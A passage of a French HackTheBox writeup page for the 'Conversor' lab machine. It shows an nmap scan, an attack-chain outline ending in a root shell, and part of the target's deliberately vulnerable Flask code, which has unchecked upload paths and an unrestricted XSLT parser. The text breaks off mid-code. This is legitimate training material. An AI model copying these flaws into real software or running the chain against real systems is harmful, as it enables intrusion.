@@ -1,0 +1,1545 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>Conversor - HackTheBox Writeup | keyll0ger</title>
+<meta name="keywords" content="HTB, Linux, Easy">
+<meta name="description" content="📋 Table des matières Informations générales Résumé exécutif Reconnaissance Énumération web Analyse des vulnérabilités Exploitation - Initial Foothold Escalade de privilèges - User Escalade de privilèges - Root Scripts d&rsquo;automatisation Recommandations et mitigations Références 🎯 Informations générales Paramètre Valeur Nom Conversor OS Linux (Ubuntu) Difficulté Medium IP 10.10.11.92 Points 30 Date Décembre 2025 📊 Résumé exécutif Conversor est une machine Linux de difficulté moyenne exploitant plusieurs vulnérabilités critiques :">
+<meta name="author" content="keyll0ger">
+<link rel="canonical" href="https://keyll0ger.github.io/posts/conversor/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.fc220c15db4aef0318bbf30adc45d33d4d7c88deff3238b23eb255afdc472ca6.css" integrity="sha256-/CIMFdtK7wMYu/MK3EXTPU18iN7/MjiyPrJVr9xHLKY=" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://keyll0ger.github.io/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://keyll0ger.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://keyll0ger.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://keyll0ger.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="https://keyll0ger.github.io/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="https://keyll0ger.github.io/posts/conversor/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+</noscript>
+  
+
+<meta property="og:title" content="Conversor - HackTheBox Writeup" />
+<meta property="og:description" content="📋 Table des matières Informations générales Résumé exécutif Reconnaissance Énumération web Analyse des vulnérabilités Exploitation - Initial Foothold Escalade de privilèges - User Escalade de privilèges - Root Scripts d&rsquo;automatisation Recommandations et mitigations Références 🎯 Informations générales Paramètre Valeur Nom Conversor OS Linux (Ubuntu) Difficulté Medium IP 10.10.11.92 Points 30 Date Décembre 2025 📊 Résumé exécutif Conversor est une machine Linux de difficulté moyenne exploitant plusieurs vulnérabilités critiques :" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://keyll0ger.github.io/posts/conversor/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2026-03-27T00:00:00+00:00" />
+<meta property="article:modified_time" content="2026-03-27T00:00:00+00:00" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Conversor - HackTheBox Writeup"/>
+<meta name="twitter:description" content="📋 Table des matières Informations générales Résumé exécutif Reconnaissance Énumération web Analyse des vulnérabilités Exploitation - Initial Foothold Escalade de privilèges - User Escalade de privilèges - Root Scripts d&rsquo;automatisation Recommandations et mitigations Références 🎯 Informations générales Paramètre Valeur Nom Conversor OS Linux (Ubuntu) Difficulté Medium IP 10.10.11.92 Points 30 Date Décembre 2025 📊 Résumé exécutif Conversor est une machine Linux de difficulté moyenne exploitant plusieurs vulnérabilités critiques :"/>
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "https://keyll0ger.github.io/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "Conversor - HackTheBox Writeup",
+      "item": "https://keyll0ger.github.io/posts/conversor/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Conversor - HackTheBox Writeup",
+  "name": "Conversor - HackTheBox Writeup",
+  "description": "📋 Table des matières Informations générales Résumé exécutif Reconnaissance Énumération web Analyse des vulnérabilités Exploitation - Initial Foothold Escalade de privilèges - User Escalade de privilèges - Root Scripts d\u0026rsquo;automatisation Recommandations et mitigations Références 🎯 Informations générales Paramètre Valeur Nom Conversor OS Linux (Ubuntu) Difficulté Medium IP 10.10.11.92 Points 30 Date Décembre 2025 📊 Résumé exécutif Conversor est une machine Linux de difficulté moyenne exploitant plusieurs vulnérabilités critiques :",
+  "keywords": [
+    "HTB", "Linux", "Easy"
+  ],
+  "articleBody": " 📋 Table des matières Informations générales Résumé exécutif Reconnaissance Énumération web Analyse des vulnérabilités Exploitation - Initial Foothold Escalade de privilèges - User Escalade de privilèges - Root Scripts d’automatisation Recommandations et mitigations Références 🎯 Informations générales Paramètre Valeur Nom Conversor OS Linux (Ubuntu) Difficulté Medium IP 10.10.11.92 Points 30 Date Décembre 2025 📊 Résumé exécutif Conversor est une machine Linux de difficulté moyenne exploitant plusieurs vulnérabilités critiques :\nXSLT Injection → Local File Inclusion (LFI) Path Traversal → Upload de fichiers malveillants Cron Job Misconfiguration → Exécution de code arbitraire Weak Password Hashing → Cracking MD5 Sudo Misconfiguration → needrestart privilege escalation 🔗 Chaîne d’attaque Recon (nmap) ↓ XSLT Injection (LFI) ↓ Path Traversal + Cron Job ↓ RCE → www-data shell ↓ SQLite Database → MD5 Hash ↓ Hashcat → User Credentials ↓ SSH → fismathack user ↓ sudo needrestart -c ↓ Configuration Injection ↓ ROOT SHELL 🔍 Reconnaissance Scan Nmap nmap -sC -sV -p- -oA nmap/conversor_full 10.10.11.92 Résultats :\nPORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA) |_ 256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519) 80/tcp open http Apache httpd 2.4.52 ((Ubuntu)) |_http-server-header: Apache/2.4.52 (Ubuntu) |_http-title: Conversor - XML/XSLT Conversion Platform Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Points clés SSH : OpenSSH 8.9p1 (version récente, pas de vulnérabilités connues) HTTP : Apache 2.4.52 hébergeant une application web Python Attack Surface : L’application web sera notre point d’entrée principal 🌐 Énumération web Page d’accueil URL : http://10.10.11.92 ou http://conversor.htb\nL’application est une plateforme de conversion XML/XSLT permettant aux utilisateurs de :\nCréer un compte Se connecter Uploader des fichiers XML et XSLT Obtenir un résultat de transformation Découverte du code source En explorant l’application, nous découvrons les fichiers critiques suivants :\n📄 app.py (Code source principal) from lxml import etree import os UPLOAD_FOLDER = '/var/www/conversor.htb/uploads' @app.route('/convert', methods=['POST']) def convert(): xml_file = request.files['xml_file'] xslt_file = request.files['xslt_file'] # ⚠️ Vulnérabilité Path Traversal xml_path = os.path.join(UPLOAD_FOLDER, xml_file.filename) xslt_path = os.path.join(UPLOAD_FOLDER, xslt_file.filename) xml_file.save(xml_path) xslt_file.save(xslt_path) # ✅ Parser XML sécurisé parser = etree.XMLParser( resolve_entities=False, no_network=True, dtd_validation=False, load_dtd=False ) xml_tree = etree.parse(xml_path, parser) # ❌ Parser XSLT non sécurisé ! xslt_tree = etree.parse(xslt_path) # Pas de restrictions transform = etree.XSLT(xslt_tree) result = transform(xml_tree) return str(result) Observations critiques :\nLe parser XML est correctement sécurisé (pas d’XXE possible) Le parser XSLT n’a aucune restriction → fonction document() disponible Aucune validation des noms de fichiers → Path Traversal 📄 install.md (Configuration système) ## Cron Jobs Pour automatiser le nettoyage et la maintenance : * * * * * www-data for f in /var/www/conversor.htb/scripts/*.py; do python3 \"$f\"; done Observation critique :\nUn cron job exécute tous les fichiers Python dans /var/www/conversor.htb/scripts/ Exécution chaque minute en tant que www-data Si nous pouvons écrire dans ce répertoire → RCE 🔓 Analyse des vulnérabilités 1️⃣ XSLT Injection → Local File Inclusion (LFI) CWE-91: XML Injection (XPath Injection)\nLe parser XSLT accepte la fonction document() qui permet de lire des fichiers arbitraires :\n",
+  "wordCount" : "3308",
+  "inLanguage": "en",
+  "datePublished": "2026-03-27T00:00:00Z",
+  "dateModified": "2026-03-27T00:00:00Z",
+  "author":{
+    "@type": "Person",
+    "name": "keyll0ger"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://keyll0ger.github.io/posts/conversor/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "keyll0ger",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://keyll0ger.github.io/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+
+<body class=" dark" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://keyll0ger.github.io/" accesskey="h" title="keyll0ger (Alt + H)">keyll0ger</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://keyll0ger.github.io/posts/" title="Writeups">
+                    <span>Writeups</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://keyll0ger.github.io/tags/" title="Tags">
+                    <span>Tags</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://keyll0ger.github.io/search/" title="Search (Alt &#43; /)" accesskey=/>
+                    <span>Search</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://keyll0ger.github.io/about/" title="About">
+                    <span>About</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    <div class="breadcrumbs"><a href="https://keyll0ger.github.io/">Home</a>&nbsp;»&nbsp;<a href="https://keyll0ger.github.io/posts/">Posts</a></div>
+    <h1 class="post-title entry-hint-parent">
+      Conversor - HackTheBox Writeup
+    </h1>
+    <div class="post-meta"><span title='2026-03-27 00:00:00 +0000 UTC'>March 27, 2026</span>&nbsp;·&nbsp;16 min&nbsp;·&nbsp;keyll0ger
+
+</div>
+  </header> <div class="toc">
+    <details  open>
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">Table of Contents</span>
+        </summary>
+
+        <div class="inner"><ul>
+                <li>
+                    <a href="#-table-des-mati%c3%a8res" aria-label="📋 Table des matières">📋 Table des matières</a></li>
+                <li>
+                    <a href="#-informations-g%c3%a9n%c3%a9rales" aria-label="🎯 Informations générales">🎯 Informations générales</a></li>
+                <li>
+                    <a href="#-r%c3%a9sum%c3%a9-ex%c3%a9cutif" aria-label="📊 Résumé exécutif">📊 Résumé exécutif</a><ul>
+                        
+                <li>
+                    <a href="#-cha%c3%aene-dattaque" aria-label="🔗 Chaîne d&rsquo;attaque">🔗 Chaîne d&rsquo;attaque</a></li></ul>
+                </li>
+                <li>
+                    <a href="#-reconnaissance" aria-label="🔍 Reconnaissance">🔍 Reconnaissance</a><ul>
+                        
+                <li>
+                    <a href="#scan-nmap" aria-label="Scan Nmap">Scan Nmap</a></li>
+                <li>
+                    <a href="#points-cl%c3%a9s" aria-label="Points clés">Points clés</a></li></ul>
+                </li>
+                <li>
+                    <a href="#-%c3%a9num%c3%a9ration-web" aria-label="🌐 Énumération web">🌐 Énumération web</a><ul>
+                        
+                <li>
+                    <a href="#page-daccueil" aria-label="Page d&rsquo;accueil">Page d&rsquo;accueil</a></li>
+                <li>
+                    <a href="#d%c3%a9couverte-du-code-source" aria-label="Découverte du code source">Découverte du code source</a><ul>
+                        
+                <li>
+                    <a href="#-apppy-code-source-principal" aria-label="📄 app.py (Code source principal)">📄 app.py (Code source principal)</a></li>
+                <li>
+                    <a href="#-installmd-configuration-syst%c3%a8me" aria-label="📄 install.md (Configuration système)">📄 install.md (Configuration système)</a></li></ul>
+                </li></ul>
+                </li>
+                <li>
+                    <a href="#-analyse-des-vuln%c3%a9rabilit%c3%a9s" aria-label="🔓 Analyse des vulnérabilités">🔓 Analyse des vulnérabilités</a><ul>
+                        
+                <li>
+                    <a href="#1-xslt-injection--local-file-inclusion-lfi" aria-label="1️⃣ XSLT Injection → Local File Inclusion (LFI)">1️⃣ XSLT Injection → Local File Inclusion (LFI)</a></li>
+                <li>
+                    <a href="#2-path-traversal" aria-label="2️⃣ Path Traversal">2️⃣ Path Traversal</a></li>
+                <li>
+                    <a href="#3-cron-job-misconfiguration" aria-label="3️⃣ Cron Job Misconfiguration">3️⃣ Cron Job Misconfiguration</a></li>
+                <li>
+                    <a href="#4-weak-password-hashing" aria-label="4️⃣ Weak Password Hashing">4️⃣ Weak Password Hashing</a></li></ul>
+                </li>
+                <li>
+                    <a href="#-exploitation---initial-foothold" aria-label="💥 Exploitation - Initial Foothold">💥 Exploitation - Initial Foothold</a><ul>
+                        
+                <li>
+                    <a href="#phase-1--xslt-injection-pour-reconnaissance" aria-label="Phase 1 : XSLT Injection pour reconnaissance">Phase 1 : XSLT Injection pour reconnaissance</a><ul>
+                        
+                <li>
+                    <a href="#fichier-xml-reconxml" aria-label="Fichier XML (recon.xml)">Fichier XML (recon.xml)</a></li>
+                <li>
+                    <a href="#fichier-xslt-malveillant-reconxslt" aria-label="Fichier XSLT malveillant (recon.xslt)">Fichier XSLT malveillant (recon.xslt)</a></li>
+                <li>
+                    <a href="#exploitation-manuelle" aria-label="Exploitation manuelle">Exploitation manuelle</a></li></ul>
+                </li>
+                <li>
+                    <a href="#phase-2--path-traversal--reverse-shell" aria-label="Phase 2 : Path Traversal &#43; Reverse Shell">Phase 2 : Path Traversal + Reverse Shell</a><ul>
+                        
+                <li>
+                    <a href="#cr%c3%a9ation-du-reverse-shell-python" aria-label="Création du reverse shell Python">Création du reverse shell Python</a></li>
+                <li>
+                    <a href="#exploitation-avec-burp-suite" aria-label="Exploitation avec Burp Suite">Exploitation avec Burp Suite</a></li></ul>
+                </li>
+                <li>
+                    <a href="#stabilisation-du-shell" aria-label="Stabilisation du shell">Stabilisation du shell</a></li></ul>
+                </li>
+                <li>
+                    <a href="#-escalade-de-privil%c3%a8ges---user" aria-label="👤 Escalade de privilèges - User">👤 Escalade de privilèges - User</a><ul>
+                        
+                <li>
+                    <a href="#%c3%a9num%c3%a9ration-du-syst%c3%a8me" aria-label="Énumération du système">Énumération du système</a></li>
+                <li>
+                    <a href="#exploration-de-la-base-de-donn%c3%a9es" aria-label="Exploration de la base de données">Exploration de la base de données</a></li>
+                <li>
+                    <a href="#extraction-des-credentials" aria-label="Extraction des credentials">Extraction des credentials</a></li>
+                <li>
+                    <a href="#cracking-des-hash-md5" aria-label="Cracking des hash MD5">Cracking des hash MD5</a><ul>
+                        
+                <li>
+                    <a href="#sur-kali-linux" aria-label="Sur Kali Linux">Sur Kali Linux</a></li></ul>
+                </li>
+                <li>
+                    <a href="#pivot-vers-lutilisateur-fismathack" aria-label="Pivot vers l&rsquo;utilisateur fismathack">Pivot vers l&rsquo;utilisateur fismathack</a><ul>
+                        
+                <li>
+                    <a href="#m%c3%a9thode-1--su-depuis-www-data" aria-label="Méthode 1 : su (depuis www-data)">Méthode 1 : su (depuis www-data)</a></li>
+                <li>
+                    <a href="#m%c3%a9thode-2--ssh-depuis-kali" aria-label="Méthode 2 : SSH (depuis Kali)">Méthode 2 : SSH (depuis Kali)</a></li></ul>
+                </li></ul>
+                </li>
+                <li>
+                    <a href="#-escalade-de-privil%c3%a8ges---root" aria-label="🔐 Escalade de privilèges - Root">🔐 Escalade de privilèges - Root</a><ul>
+                        
+                <li>
+                    <a href="#%c3%a9num%c3%a9ration-des-privil%c3%a8ges-sudo" aria-label="Énumération des privilèges sudo">Énumération des privilèges sudo</a></li>
+                <li>
+                    <a href="#analyse-de-needrestart" aria-label="Analyse de needrestart">Analyse de needrestart</a></li>
+                <li>
+                    <a href="#recherche-de-cve" aria-label="Recherche de CVE">Recherche de CVE</a></li>
+                <li>
+                    <a href="#exploitation---configuration-injection" aria-label="Exploitation - Configuration Injection">Exploitation - Configuration Injection</a><ul>
+                        
+                <li>
+                    <a href="#pr%c3%a9paration-du-listener" aria-label="Préparation du listener">Préparation du listener</a></li>
+                <li>
+                    <a href="#cr%c3%a9ation-du-fichier-de-configuration-malveillant" aria-label="Création du fichier de configuration malveillant">Création du fichier de configuration malveillant</a></li>
+                <li>
+                    <a href="#ex%c3%a9cution-de-lexploit" aria-label="Exécution de l&rsquo;exploit">Exécution de l&rsquo;exploit</a></li>
+                <li>
+                    <a href="#r%c3%a9ception-du-shell-root" aria-label="Réception du shell root">Réception du shell root</a></li></ul>
+                </li>
+                <li>
+                    <a href="#m%c3%a9thode-alternative--persistence" aria-label="Méthode alternative : Persistence">Méthode alternative : Persistence</a></li></ul>
+                </li>
+                <li>
+                    <a href="#-scripts-dautomatisation" aria-label="🤖 Scripts d&rsquo;automatisation">🤖 Scripts d&rsquo;automatisation</a><ul>
+                        
+                <li>
+                    <a href="#script-dexploitation-complet-exploitpy" aria-label="Script d&rsquo;exploitation complet (exploit.py)">Script d&rsquo;exploitation complet (exploit.py)</a></li>
+                <li>
+                    <a href="#utilisation-du-script" aria-label="Utilisation du script">Utilisation du script</a></li></ul>
+                </li>
+                <li>
+                    <a href="#-recommandations-et-mitigations" aria-label="🛡️ Recommandations et mitigations">🛡️ Recommandations et mitigations</a><ul>
+                        
+                <li>
+                    <a href="#1-xslt-parser-security" aria-label="1. XSLT Parser Security">1. XSLT Parser Security</a></li>
+                <li>
+                    <a href="#2-path-traversal-prevention" aria-label="2. Path Traversal Prevention">2. Path Traversal Prevention</a></li>
+                <li>
+                    <a href="#3-cron-job-security" aria-label="3. Cron Job Security">3. Cron Job Security</a></li>
+                <li>
+                    <a href="#4-password-hashing" aria-label="4. Password Hashing">4. Password Hashing</a></li>
+                <li>
+                    <a href="#5-sudo-configuration-pour-needrestart" aria-label="5. Sudo Configuration pour needrestart">5. Sudo Configuration pour needrestart</a></li>
+                <li>
+                    <a href="#6-web-application-firewall-waf" aria-label="6. Web Application Firewall (WAF)">6. Web Application Firewall (WAF)</a></li>
+                <li>
+                    <a href="#7-logging-et-monitoring" aria-label="7. Logging et Monitoring">7. Logging et Monitoring</a></li>
+                <li>
+                    <a href="#8-architecture-recommand%c3%a9e" aria-label="8. Architecture Recommandée">8. Architecture Recommandée</a></li></ul>
+                </li>
+                <li>
+                    <a href="#-r%c3%a9f%c3%a9rences" aria-label="📚 Références">📚 Références</a><ul>
+                        
+                <li>
+                    <a href="#cve-et-vuln%c3%a9rabilit%c3%a9s" aria-label="CVE et Vulnérabilités">CVE et Vulnérabilités</a></li>
+                <li>
+                    <a href="#documentation-technique" aria-label="Documentation Technique">Documentation Technique</a></li>
+                <li>
+                    <a href="#articles-et-writeups" aria-label="Articles et Writeups">Articles et Writeups</a></li>
+                <li>
+                    <a href="#outils-utilis%c3%a9s" aria-label="Outils utilisés">Outils utilisés</a></li></ul>
+                </li>
+                <li>
+                    <a href="#-le%c3%a7ons-apprises" aria-label="🎓 Leçons apprises">🎓 Leçons apprises</a><ul>
+                        
+                <li>
+                    <a href="#points-cl%c3%a9s-de-cette-machine" aria-label="Points clés de cette machine">Points clés de cette machine</a></li>
+                <li>
+                    <a href="#techniques-de-pentest-appliqu%c3%a9es" aria-label="Techniques de pentest appliquées">Techniques de pentest appliquées</a></li></ul>
+                </li>
+                <li>
+                    <a href="#-timeline-de-lexploitation" aria-label="📊 Timeline de l&rsquo;exploitation">📊 Timeline de l&rsquo;exploitation</a></li>
+                <li>
+                    <a href="#-conclusion" aria-label="💭 Conclusion">💭 Conclusion</a>
+                </li>
+            </ul>
+        </div>
+    </details>
+</div>
+
+  <div class="post-content"><p><img loading="lazy" src="https://img.shields.io/badge/Difficulty-Medium-yellow" alt="Difficulty: Medium"  />
+
+<img loading="lazy" src="https://img.shields.io/badge/OS-Linux-blue" alt="OS: Linux"  />
+
+<img loading="lazy" src="https://img.shields.io/badge/Release-December%202025-green" alt="Release Date"  />
+</p>
+<hr>
+<h2 id="-table-des-matières">📋 Table des matières<a hidden class="anchor" aria-hidden="true" href="#-table-des-matières">#</a></h2>
+<ol>
+<li><a href="#informations-g%C3%A9n%C3%A9rales">Informations générales</a></li>
+<li><a href="#r%C3%A9sum%C3%A9-ex%C3%A9cutif">Résumé exécutif</a></li>
+<li><a href="#reconnaissance">Reconnaissance</a></li>
+<li><a href="#%C3%A9num%C3%A9ration-web">Énumération web</a></li>
+<li><a href="#analyse-des-vuln%C3%A9rabilit%C3%A9s">Analyse des vulnérabilités</a></li>
+<li><a href="#exploitation---initial-foothold">Exploitation - Initial Foothold</a></li>
+<li><a href="#escalade-de-privil%C3%A8ges---user">Escalade de privilèges - User</a></li>
+<li><a href="#escalade-de-privil%C3%A8ges---root">Escalade de privilèges - Root</a></li>
+<li><a href="#scripts-dautomatisation">Scripts d&rsquo;automatisation</a></li>
+<li><a href="#recommandations-et-mitigations">Recommandations et mitigations</a></li>
+<li><a href="#r%C3%A9f%C3%A9rences">Références</a></li>
+</ol>
+<hr>
+<h2 id="-informations-générales">🎯 Informations générales<a hidden class="anchor" aria-hidden="true" href="#-informations-générales">#</a></h2>
+<table>
+<thead>
+<tr>
+<th>Paramètre</th>
+<th>Valeur</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Nom</strong></td>
+<td>Conversor</td>
+</tr>
+<tr>
+<td><strong>OS</strong></td>
+<td>Linux (Ubuntu)</td>
+</tr>
+<tr>
+<td><strong>Difficulté</strong></td>
+<td>Medium</td>
+</tr>
+<tr>
+<td><strong>IP</strong></td>
+<td>10.10.11.92</td>
+</tr>
+<tr>
+<td><strong>Points</strong></td>
+<td>30</td>
+</tr>
+<tr>
+<td><strong>Date</strong></td>
+<td>Décembre 2025</td>
+</tr>
+</tbody>
+</table>
+<hr>
+<h2 id="-résumé-exécutif">📊 Résumé exécutif<a hidden class="anchor" aria-hidden="true" href="#-résumé-exécutif">#</a></h2>
+<p><strong>Conversor</strong> est une machine Linux de difficulté moyenne exploitant plusieurs vulnérabilités critiques :</p>
+<ol>
+<li><strong>XSLT Injection</strong> → Local File Inclusion (LFI)</li>
+<li><strong>Path Traversal</strong> → Upload de fichiers malveillants</li>
+<li><strong>Cron Job Misconfiguration</strong> → Exécution de code arbitraire</li>
+<li><strong>Weak Password Hashing</strong> → Cracking MD5</li>
+<li><strong>Sudo Misconfiguration</strong> → needrestart privilege escalation</li>
+</ol>
+<h3 id="-chaîne-dattaque">🔗 Chaîne d&rsquo;attaque<a hidden class="anchor" aria-hidden="true" href="#-chaîne-dattaque">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>Recon (nmap) 
+</span></span><span style="display:flex;"><span>    ↓
+</span></span><span style="display:flex;"><span>XSLT Injection (LFI)
+</span></span><span style="display:flex;"><span>    ↓
+</span></span><span style="display:flex;"><span>Path Traversal + Cron Job
+</span></span><span style="display:flex;"><span>    ↓
+</span></span><span style="display:flex;"><span>RCE → www-data shell
+</span></span><span style="display:flex;"><span>    ↓
+</span></span><span style="display:flex;"><span>SQLite Database → MD5 Hash
+</span></span><span style="display:flex;"><span>    ↓
+</span></span><span style="display:flex;"><span>Hashcat → User Credentials
+</span></span><span style="display:flex;"><span>    ↓
+</span></span><span style="display:flex;"><span>SSH → fismathack user
+</span></span><span style="display:flex;"><span>    ↓
+</span></span><span style="display:flex;"><span>sudo needrestart -c
+</span></span><span style="display:flex;"><span>    ↓
+</span></span><span style="display:flex;"><span>Configuration Injection
+</span></span><span style="display:flex;"><span>    ↓
+</span></span><span style="display:flex;"><span>ROOT SHELL
+</span></span></code></pre></div><hr>
+<h2 id="-reconnaissance">🔍 Reconnaissance<a hidden class="anchor" aria-hidden="true" href="#-reconnaissance">#</a></h2>
+<h3 id="scan-nmap">Scan Nmap<a hidden class="anchor" aria-hidden="true" href="#scan-nmap">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -sC -sV -p- -oA nmap/conversor_full 10.10.11.92
+</span></span></code></pre></div><p><strong>Résultats</strong> :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>PORT   STATE SERVICE VERSION
+</span></span><span style="display:flex;"><span>22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
+</span></span><span style="display:flex;"><span>| ssh-hostkey: 
+</span></span><span style="display:flex;"><span>|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
+</span></span><span style="display:flex;"><span>|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
+</span></span><span style="display:flex;"><span>80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
+</span></span><span style="display:flex;"><span>|_http-server-header: Apache/2.4.52 (Ubuntu)
+</span></span><span style="display:flex;"><span>|_http-title: Conversor - XML/XSLT Conversion Platform
+</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span></code></pre></div><h3 id="points-clés">Points clés<a hidden class="anchor" aria-hidden="true" href="#points-clés">#</a></h3>
+<ul>
+<li><strong>SSH</strong> : OpenSSH 8.9p1 (version récente, pas de vulnérabilités connues)</li>
+<li><strong>HTTP</strong> : Apache 2.4.52 hébergeant une application web Python</li>
+<li><strong>Attack Surface</strong> : L&rsquo;application web sera notre point d&rsquo;entrée principal</li>
+</ul>
+<hr>
+<h2 id="-énumération-web">🌐 Énumération web<a hidden class="anchor" aria-hidden="true" href="#-énumération-web">#</a></h2>
+<h3 id="page-daccueil">Page d&rsquo;accueil<a hidden class="anchor" aria-hidden="true" href="#page-daccueil">#</a></h3>
+<p>URL : <code>http://10.10.11.92</code> ou <code>http://conversor.htb</code></p>
+<p>L&rsquo;application est une <strong>plateforme de conversion XML/XSLT</strong> permettant aux utilisateurs de :</p>
+<ul>
+<li>Créer un compte</li>
+<li>Se connecter</li>
+<li>Uploader des fichiers XML et XSLT</li>
+<li>Obtenir un résultat de transformation</li>
+</ul>
+<h3 id="découverte-du-code-source">Découverte du code source<a hidden class="anchor" aria-hidden="true" href="#découverte-du-code-source">#</a></h3>
+<p>En explorant l&rsquo;application, nous découvrons les fichiers critiques suivants :</p>
+<h4 id="-apppy-code-source-principal">📄 app.py (Code source principal)<a hidden class="anchor" aria-hidden="true" href="#-apppy-code-source-principal">#</a></h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> lxml <span style="color:#f92672">import</span> etree
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> os
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>UPLOAD_FOLDER <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;/var/www/conversor.htb/uploads&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#39;/convert&#39;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#39;POST&#39;</span>])
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">convert</span>():
+</span></span><span style="display:flex;"><span>    xml_file <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>files[<span style="color:#e6db74">&#39;xml_file&#39;</span>]
+</span></span><span style="display:flex;"><span>    xslt_file <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>files[<span style="color:#e6db74">&#39;xslt_file&#39;</span>]
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># ⚠️ Vulnérabilité Path Traversal</span>
+</span></span><span style="display:flex;"><span>    xml_path <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(UPLOAD_FOLDER, xml_file<span style="color:#f92672">.</span>filename)
